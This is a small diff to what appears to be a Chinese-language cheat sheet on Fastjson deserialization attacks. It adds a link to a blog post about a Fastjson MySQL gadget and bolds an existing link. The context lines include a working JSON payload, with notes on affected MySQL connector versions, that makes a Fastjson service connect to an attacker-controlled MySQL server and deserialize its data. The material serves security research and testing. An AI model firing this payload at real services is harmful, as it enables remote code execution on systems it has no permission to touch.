@@ -1164,7 +1164,8 @@ Mysqlconnector 6.0.2 or 6.0.3
 Mysqlconnector 6.x or < 8.0.20
 {"@type":"java.lang.AutoCloseable","@type":"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection","proxy":{"@type":"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy","connectionUrl":{"@type":"com.mysql.cj.conf.url.ReplicationConnectionUrl", "masters": [{"host":"mysql.host"}], "slaves":[], "properties":{"host":"mysql.host","user":"user","dbname":"dbname","password":"pass","queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true"}}}}
 ```
-
+**mysql **
+https://summersec.github.io/BlogParpers/2021/Fastjson_Mysql_gadget%E5%A4%8D%E7%8E%B0.html
 
 
 ### fastjson未知版本
@@ -1201,7 +1202,7 @@ Fastjson默认会去除键、值外的空格、`\b`、`\n`、`\r`、`\f`等，�
 ```
 
 
-这个文章太牛皮了
+**这个文章太牛皮了**
 
-https://www.sec-in.com/article/950
+**https://www.sec-in.com/article/950**
 
